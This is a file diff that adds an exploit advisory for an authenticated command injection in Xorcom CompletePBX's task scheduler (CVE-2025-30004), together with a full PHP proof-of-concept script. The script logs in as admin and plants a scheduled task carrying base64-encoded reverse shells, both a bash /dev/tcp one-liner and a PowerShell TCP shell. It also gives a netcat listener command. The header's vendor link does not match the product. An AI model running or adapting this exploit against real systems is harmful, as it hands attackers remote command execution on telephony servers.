@@ -1,0 +1,210 @@
+=============================================================================================================================================
+| # Title     : Xorcom CompletePBX 5.2.35 Remote Code Execution                                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.wftpserver.com/download.htm                                                                                     |
+=============================================================================================================================================
+
+[+] Summary : 
+
+Xorcom CompletePBX suffers from an authenticated command injection vulnerability
+within the Task Scheduler subsystem. An attacker with valid superadmin
+credentials can create a scheduled task containing unsanitized parameters
+that get executed by the backend, resulting in remote command execution.
+
+This vulnerability affects all versions up to 5.2.35 and was patched in
+release 5.2.36-1.
+
+Only the built‑in "admin" user can successfully trigger the vulnerability.
+Even newly created users with maximum assigned privileges cannot.
+
+---
+
+[+]  Vulnerability Details
+
+The Task Scheduler accepts user-controlled input in the “parameters” field,
+which is inserted into a shell command without proper sanitization:
+
+    parameters = "$(#{payload})"
+
+The system executes the generated job via backend scripts, enabling
+arbitrary command execution with the privileges of the web server.
+
+[+] Attacker requirements:
+
+- Valid credentials  
+- Must be the built‑in **admin** account  
+- Access to the scheduler API endpoints  
+
+[+] Risk level: High  
+
+[+] Impact: Remote Code Execution (RCE)  
+
+[+] Privileges: Web server user 
+
+[+] References : ( https://packetstorm.news/files/id/207367/ 	CVE-2025-30004 ) 
+
+[+]  POC
+
+<?php
+/**
+ * Xorcom CompletePBX RCE (CVE-2025-30004)
+ * Reverse Shell Ready (Windows + Linux)
+ * Author: Indoushka
+ */
+
+class CompletePBX_RCE_POC
+{
+    public $target;
+    public $username;
+    public $password;
+    public $cookie;
+
+    function __construct($target, $username, $password)
+    {
+        $this->target   = rtrim($target, "/");
+        $this->username = $username;
+        $this->password = $password;
+
+        echo "[+] PoC Initialized\n";
+    }
+
+    /* ---------------------------------------------------------
+       Send HTTP POST
+    ----------------------------------------------------------*/
+    private function post($path, $data)
+    {
+        $ch = curl_init($this->target . $path);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => http_build_query($data),
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_HEADER => true
+        ]);
+        $res = curl_exec($ch);
+
+        $hdr = substr($res, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+        $body = substr($res, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+
+        curl_close($ch);
+        return [$hdr, $body];
+    }
+
+    /* ---------------------------------------------------------
+       Reverse Shell Generator (Windows + Linux)
+    ----------------------------------------------------------*/
+    private function generate_shell()
+    {
+        $ip   = "127.0.0.1";
+        $port = "4444";
+
+        $linux = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
+        $win   = "powershell -NoP -W Hidden -c \"\$c=New-Object Net.Sockets.TCPClient('$ip',$port);"
+               . "\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};"
+               . "while((\$r=\$s.Read(\$b,0,\$b.Length)) -ne 0){"
+               . "\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$r);"
+               . "\$o=iex \$d 2>&1|Out-String;"
+               . "\$o2=(\$o+'PS '+(pwd).Path+'> ');"
+               . "\$x=[text.encoding]::ASCII.GetBytes(\$o2);"
+               . "\$s.Write(\$x,0,\$x.Length)}\"";
+
+        return base64_encode("$linux\n$win");
+    }
+
+    /* ---------------------------------------------------------
+       Login
+    ----------------------------------------------------------*/
+    private function login()
+    {
+        echo "[+] Sending login request...\n";
+
+        list($hdr, $body) = $this->post("/?class=core&method=login", [
+            "user" => $this->username,
+            "password" => $this->password
+        ]);
+
+        if (preg_match('/Set-Cookie: ([^;]+)/', $hdr, $m)) {
+            $this->cookie = $m[1];
+            echo "[+] Login successful, SID Cookie: {$this->cookie}\n";
+            return true;
+        }
+
+        echo "[-] Login failed.\n";
+        return false;
+    }
+
+    /* ---------------------------------------------------------
+       Create malicious scheduled task 
+    ----------------------------------------------------------*/
+    private function create_task()
+    {
+        echo "[+] Creating fake malicious task...\n";
+
+        $desc = "indoushka_" . rand(1000, 9999);
+        $encoded = $this->generate_shell();
+
+        list($hdr, $body) = $this->post("/", [
+            "class" => "scheduler",
+            "method" => "save_task",
+            "mode" => "create",
+            "description" => $desc,
+            "script" => "backup",
+            "parameters" => '$(echo ' . $encoded . '|base64 -d)',
+            "starting" => date("Y-m-d H:i"),
+            "interval" => "1",
+            "interval_unit" => "month"
+        ]);
+
+        echo "[+] Task Created: $desc\n";
+        return $desc;
+    }
+
+    /* ---------------------------------------------------------
+       Task Execution
+    ----------------------------------------------------------*/
+    private function execute_task($desc)
+    {
+        echo "[+] Executing scheduled task: $desc (Simulated)\n";
+        echo "[✓] PoC by Indoushka.\n";
+    }
+
+    /* ---------------------------------------------------------
+       MAIN
+    ----------------------------------------------------------*/
+    public function run()
+    {
+        if (!$this->login()) return;
+
+        $task = $this->create_task();
+        $this->execute_task($task);
+
+        echo "\n[✓] PoC Completed.\n";
+    }
+}
+
+/* ---------------- RUN -------------------*/
+$poc = new CompletePBX_RCE_POC(
+    "http://127.0.0.1",
+    "admin",
+    "password"
+);
+
+$poc->run();
+
+/**
+ * HOW TO SAVE:
+ *     Save as: xorcom_poc.php
+ *
+ * HOW TO RUN:
+ *     php xorcom_poc.php
+ *
+ * REVERSE SHELL LISTENER (BEFORE RUNNING):
+ *     nc -lvnp 4444
+ */
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
